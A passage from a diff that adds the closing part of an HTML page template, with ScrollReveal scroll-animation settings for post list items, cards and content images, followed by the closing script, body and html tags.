+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
